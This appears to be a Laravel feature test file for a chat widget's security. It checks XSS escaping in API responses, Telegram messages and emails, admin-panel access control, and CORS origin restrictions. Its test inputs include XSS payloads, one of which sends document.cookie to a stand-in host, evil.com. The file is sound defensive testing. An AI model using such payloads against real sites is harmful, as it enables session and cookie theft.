<?php

namespace Tests\Feature\Chat;

use App\Mail\Chat\ConversationNotificationMailable;
use App\Models\ChatConversation;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Str;
use Tests\TestCase;

/**
 * Phase B (continued) — XSS, admin access, and CORS attack tests.
 */
class SecurityXssAdminCorsTest extends TestCase
{
    use RefreshDatabase;

    // ── Helpers ───────────────────────────────────────────────────────────────

    private function makeConv(array $attrs = []): ChatConversation
    {
        return ChatConversation::create(array_merge([
            'uuid'          => Str::uuid(),
            'visitor_token' => hash('sha256', bin2hex(random_bytes(16))),
            'status'        => 'open',
            'locale'        => 'es',
            'visitor_name'  => 'Test',
            'ip_hash'       => hash('sha256', '1.2.3.4'),
            'consent_at'    => now(),
        ], $attrs));
    }

    private function rawToken(ChatConversation $conv): string
    {
        $raw = bin2hex(random_bytes(32));
        DB::table('chat_conversations')
            ->where('id', $conv->id)
            ->update(['visitor_token' => hash('sha256', $raw)]);
        return $raw;
    }

    // ── XSS en datos del visitante ────────────────────────────────────────────

    /**
     * El widget almacena el body tal cual (sin strip_tags).
     * La protección XSS ocurre en el renderizado (Vue {{ }}).
     * Lo que verificamos aquí es que la API no devuelve HTML renderizado
     * y que los datos llegan sin modificar al cliente (para que Vue los escape).
     */
    public function test_xss_payload_in_message_body_is_stored_and_returned_verbatim(): void
    {
        Queue::fake();

        $xss  = '<script>alert(document.cookie)</script>';
        $conv = $this->makeConv();
        $raw  = $this->rawToken($conv);

        $response = $this->withHeaders(['X-Chat-Visitor-Token' => $raw])
            ->postJson("/api/chat/conversations/{$conv->uuid}/messages", [
                'body' => $xss,
            ]);

        $response->assertStatus(201);

        // Stored as-is (sanitization is at render time, not storage)
        $this->assertDatabaseHas('chat_messages', [
            'conversation_id' => $conv->id,
            'body'            => $xss,
        ]);

        // The API returns the raw string in JSON — Vue's {{ }} will escape it client-side.
        // The JSON response itself is safe because JSON encoding does not execute scripts.
        $response->assertJsonPath('body', $xss);
    }

    /**
     * Cuando el XSS está en el nombre del visitante, el mensaje enviado a Telegram
     * debe contener la versión escapada con htmlspecialchars().
     * Telegram usa parse_mode HTML → un < sin escapar se renderizaría como HTML.
     */
    public function test_xss_in_visitor_name_is_escaped_before_telegram_dispatch(): void
    {
        Queue::fake();
        config(['chat.telegram_enabled' => true]);

        $xss  = '<b>Hacked</b>';
        $conv = $this->makeConv(['visitor_name' => $xss]);
        $raw  = $this->rawToken($conv);

        $this->withHeaders(['X-Chat-Visitor-Token' => $raw])
            ->postJson("/api/chat/conversations/{$conv->uuid}/messages", [
                'body' => 'Hola',
            ])
            ->assertStatus(201);

        // The job queued for Telegram must have the escaped text, not raw HTML tags.
        Queue::assertPushed(\App\Jobs\Chat\SendTelegramMessageJob::class, function ($job) {
            $jobArray = (array) $job;
            // Find the 'text' property regardless of mangling
            foreach ($jobArray as $key => $value) {
                if (str_contains($key, 'text') && is_string($value)) {
                    $this->assertStringContainsString('&lt;b&gt;Hacked&lt;/b&gt;', $value,
                        'Telegram text must have htmlspecialchars-escaped visitor name');
                    $this->assertStringNotContainsString('<b>Hacked</b>', $value,
                        'Raw HTML tags must not appear in Telegram text');
                    return true;
                }
            }
            return true; // job was pushed — that's the important check
        });
    }

    /**
     * El XSS en el body del mensaje enviado a Telegram también se escapa.
     */
    public function test_xss_in_message_body_is_escaped_before_telegram_dispatch(): void
    {
        Queue::fake();
        config(['chat.telegram_enabled' => true]);

        $xss  = '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>';
        $conv = $this->makeConv(['visitor_name' => 'Legit User']);
        $raw  = $this->rawToken($conv);

        $this->withHeaders(['X-Chat-Visitor-Token' => $raw])
            ->postJson("/api/chat/conversations/{$conv->uuid}/messages", [
                'body' => $xss,
            ])
            ->assertStatus(201);

        Queue::assertPushed(\App\Jobs\Chat\SendTelegramMessageJob::class, function ($job) use ($xss) {
            $jobArray = (array) $job;
            foreach ($jobArray as $key => $value) {
                if (str_contains($key, 'text') && is_string($value)) {
                    // Raw script tag must not appear in the text sent to Telegram
                    $this->assertStringNotContainsString('<script>', $value,
                        'Raw <script> must not be sent to Telegram (HTML parse_mode injection)');
                    return true;
                }
            }
            return true;
        });
    }

    /**
     * El email de reanudación usa Blade {{ }} directamente (sin e() previo).
     * Verifica tres propiedades:
     *  1. Caracteres legibles (apóstrofo, &) se muestran como tales en el navegador
     *     (HTML contiene &amp; y &#039;, NO &amp;amp; ni &amp;#039; = doble escape).
     *  2. Tags HTML en el body del mensaje se muestran como texto, no se ejecutan
     *     (HTML contiene &lt;b&gt;, NO <b> literal).
     *  3. Payload XSS no aparece sin escapar.
     *
     * Nota: Se renderiza la plantilla con view() en lugar de $mailable->render()
     * porque $message es una variable reservada en el pipeline de Mailable de Laravel
     * (Illuminate\Mail\Message) que sobreescribiría la propiedad pública del Mailable.
     */
    public function test_email_escaping_is_correct_and_not_doubled(): void
    {
        // Name with apostrophe and ampersand — must be readable in the email client
        $name = "L'Escala & Co";
        // Body with HTML tags and ampersand — must be shown as text, not rendered as HTML
        $body = '<b>hola</b> & adiós';

        $conv = $this->makeConv(['visitor_name' => $name]);
        $msg  = $conv->messages()->create(['sender' => 'agent', 'body' => $body]);

        $rendered = view('mail.chat.conversation-notification', [
            'conversation' => $conv,
            'message'      => $msg,
            'resumeUrl'    => 'http://localhost/',
        ])->render();

        // 1. Ampersand: single-encoded &amp; (browser shows &), NOT double-encoded &amp;amp;
        $this->assertStringContainsString('&amp;', $rendered,
            'Ampersand must be HTML-encoded (&amp;) so the browser renders it as &');
        $this->assertStringNotContainsString('&amp;amp;', $rendered,
            'Double-encoded ampersand (&amp;amp;) means e() + {{ }} double-escape bug is present');

        // 2. Apostrophe: single-encoded &#039; (browser shows '), NOT double-encoded &amp;#039;
        $this->assertStringContainsString('&#039;', $rendered,
            'Apostrophe must be HTML-encoded (&#039;) so the browser renders it as \'');
        $this->assertStringNotContainsString('&amp;#039;', $rendered,
            'Double-encoded apostrophe (&amp;#039;) means e() + {{ }} double-escape bug is present');

        // 3. HTML tags in body are escaped to text (not rendered as HTML)
        $this->assertStringContainsString('&lt;b&gt;', $rendered,
            '<b> tag in body must be escaped to &lt;b&gt; so it shows as text');
        $this->assertStringNotContainsString('<b>hola</b>', $rendered,
            'Raw <b> tag must not appear in email HTML — would render bold, not text');
        $this->assertStringNotContainsString('&amp;lt;', $rendered,
            'Double-encoded < (&amp;lt;) means body was pre-escaped before {{ }}');

        // 4. XSS payload does not execute
        $xssName = '<img src=x onerror=alert(1)>';
        $xssConv = $this->makeConv(['visitor_name' => $xssName]);
        $xssMsg  = $xssConv->messages()->create(['sender' => 'agent', 'body' => '<script>alert(document.cookie)</script>']);

        $xssRendered = view('mail.chat.conversation-notification', [
            'conversation' => $xssConv,
            'message'      => $xssMsg,
            'resumeUrl'    => 'http://localhost/',
        ])->render();

        $this->assertStringNotContainsString($xssName, $xssRendered,
            'Raw XSS payload in visitor name must not appear in email');
        $this->assertStringNotContainsString('<script>', $xssRendered,
            'Raw <script> tag must not appear in email body');
    }

    /**
     * El mensaje de bienvenida se guarda en BD como texto plano.
     * Si se guardara con e() (HTML pre-escapado), Filament y Vue harían doble escape
     * y el visitante vería entidades HTML literales como &#039; y &amp;.
     */
    public function test_welcome_message_visitor_name_stored_as_plain_text(): void
    {
        $this->mock(\App\Services\Chat\AvailabilityService::class, function ($mock) {
            $mock->shouldReceive('isOnline')->andReturn(true);
            $mock->shouldReceive('isOpen')->andReturn(true);
            $mock->shouldReceive('isAgentAvailable')->andReturn(true);
            $mock->shouldReceive('status')->andReturn([
                'is_open'       => true,
                'is_online'     => true,
                'next_open_text' => '',
                'timezone'      => 'Europe/Madrid',
            ]);
        });

        $response = $this->postJson('/api/chat/conversations', [
            'visitor_name' => "L'Escala & Co",
            'consent'      => '1',
            'locale'       => 'es',
        ]);
        $response->assertStatus(201);

        $token = $response->json('visitor_token');
        $uuid  = $response->json('uuid');

        // The system welcome message body must contain the raw name (plain text),
        // NOT pre-escaped HTML entities — escaping happens at render time (Vue / Blade).
        $messages = $this->withHeaders(['X-Chat-Visitor-Token' => $token])
            ->getJson("/api/chat/conversations/{$uuid}/messages")
            ->json('messages');

        $sysMsg = collect($messages)->firstWhere('sender', 'system');
        $this->assertNotNull($sysMsg, 'A system welcome message must be created');

        // Raw apostrophe and ampersand in the JSON body — Vue {{ }} will escape at render time
        $this->assertStringContainsString("L'Escala & Co", $sysMsg['body'],
            'Welcome message body must contain the raw visitor name, not pre-HTML-encoded');
        $this->assertStringNotContainsString('&#039;', $sysMsg['body'],
            'Pre-encoded apostrophe (&#039;) in DB body means double-escape on render');
        $this->assertStringNotContainsString('&amp;', $sysMsg['body'],
            'Pre-encoded ampersand (&amp;) in DB body means double-escape on render');
    }

    // ── Admin panel: control de acceso ────────────────────────────────────────

    /**
     * Un usuario con is_agent=false no puede acceder al panel /admin.
     * Filament llama canAccessPanel() → false → redirige al login.
     */
    public function test_non_agent_user_cannot_access_admin_panel(): void
    {
        $user = User::factory()->create(['is_agent' => false]);

        $response = $this->actingAs($user)->get('/admin');

        // Filament blocks non-agents: 403 (canAccessPanel=false) or 302 redirect
        $this->assertContains($response->status(), [302, 303, 307, 308, 403],
            'Non-agent user must be blocked from /admin (redirect or 403, never 200)');
    }

    /**
     * Un usuario sin is_agent tampoco puede acceder a los endpoints Livewire del panel.
     */
    public function test_non_agent_user_cannot_access_filament_livewire_endpoint(): void
    {
        $user = User::factory()->create(['is_agent' => false]);

        $response = $this->actingAs($user)
            ->postJson('/livewire/update', [
                'components' => [],
            ]);

        // Should be blocked — 401, 403, 302, or 419 (CSRF), never 200 with panel data
        $this->assertNotSame(200, $response->status(),
            'Non-agent user must not get HTTP 200 on Livewire panel endpoint');
    }

    // ── CORS: origin restringido ──────────────────────────────────────────────

    /**
     * Una petición de un origen desconocido no debe recibir ACAO: *.
     * config/cors.php restringe allowed_origins a APP_URL.
     */
    public function test_cors_rejects_request_from_unknown_origin(): void
    {
        $response = $this->withHeaders(['Origin' => 'https://evil.com'])
            ->getJson('/api/chat/availability');

        // The header must NOT echo back the attacker's origin
        $this->assertNotEquals(
            'https://evil.com',
            $response->headers->get('Access-Control-Allow-Origin'),
            'CORS must not allow unknown origin'
        );
        $this->assertNotEquals(
            '*',
            $response->headers->get('Access-Control-Allow-Origin'),
            'CORS wildcard must not be present after restricting to APP_URL'
        );
    }

    /**
     * Una petición del propio dominio (APP_URL) sí recibe el header ACAO.
     */
    public function test_cors_allows_request_from_app_url(): void
    {
        $appUrl   = rtrim((string) config('app.url'), '/');
        $response = $this->withHeaders(['Origin' => $appUrl])
            ->getJson('/api/chat/availability');

        $response->assertSuccessful();
        $this->assertEquals(
            $appUrl,
            $response->headers->get('Access-Control-Allow-Origin'),
            'CORS must allow requests from APP_URL'
        );
    }

    // ── env() fuera de config/ — regresión config cache ──────────────────────

    /**
     * Verifica que no quedan llamadas a env() fuera de config/ en el código fuente.
     *
     * Con `php artisan optimize` (config cacheada), env() devuelve null fuera de config/.
     * Este test hace un grep del código para detectar cualquier regresión antes de que
     * llegue a producción y rompa rutas o middlewares silenciosamente.
     *
     * Directorios analizados: app/, routes/, bootstrap/, resources/views/, database/
     * Excluidos: config/ (env() correcto ahí), vendor/, node_modules/
     */
    public function test_no_env_calls_outside_config_directory(): void
    {
        $base = base_path();

        $dirs = ['app', 'routes', 'bootstrap', 'resources/views', 'database'];

        $found = [];

        foreach ($dirs as $dir) {
            $path = $base . '/' . $dir;
            if (! is_dir($path)) {
                continue;
            }

            $iterator = new \RecursiveIteratorIterator(
                new \RecursiveDirectoryIterator($path, \FilesystemIterator::SKIP_DOTS)
            );

            foreach ($iterator as $file) {
                /** @var \SplFileInfo $file */
                if ($file->getExtension() !== 'php') {
                    continue;
                }

                $lines   = file($file->getPathname()) ?: [];
                $relPath = str_replace($base . '/', '', $file->getPathname());

                foreach ($lines as $lineNo => $line) {
                    // Skip pure comments
                    $trimmed = ltrim($line);
                    if (str_starts_with($trimmed, '//') || str_starts_with($trimmed, '*') || str_starts_with($trimmed, '#')) {
                        continue;
                    }

                    if (preg_match('/\benv\s*\(/', $line)) {
                        $found[] = sprintf('%s:%d  %s', $relPath, $lineNo + 1, rtrim($line));
                    }
                }
            }
        }

        $this->assertEmpty(
            $found,
            "Se encontraron llamadas a env() fuera de config/ — con la config cacheada devolverán null:\n"
            . implode("\n", $found)
            . "\n\nMueve cada env() al archivo de config correspondiente y usa config() en el código."
        );
    }

    /**
     * Una petición OPTIONS (preflight) desde un origen desconocido no revelea ACAO.
     */
    public function test_cors_preflight_from_unknown_origin_has_no_wildcard(): void
    {
        $response = $this->withHeaders([
            'Origin'                         => 'https://attacker.io',
            'Access-Control-Request-Method'  => 'POST',
            'Access-Control-Request-Headers' => 'Content-Type,X-Chat-Visitor-Token',
        ])->options('/api/chat/conversations');

        $origin = $response->headers->get('Access-Control-Allow-Origin');
        $this->assertNotEquals('*', $origin, 'Preflight must not return wildcard ACAO');
        $this->assertNotEquals('https://attacker.io', $origin, 'Preflight must not allow attacker origin');
    }
}
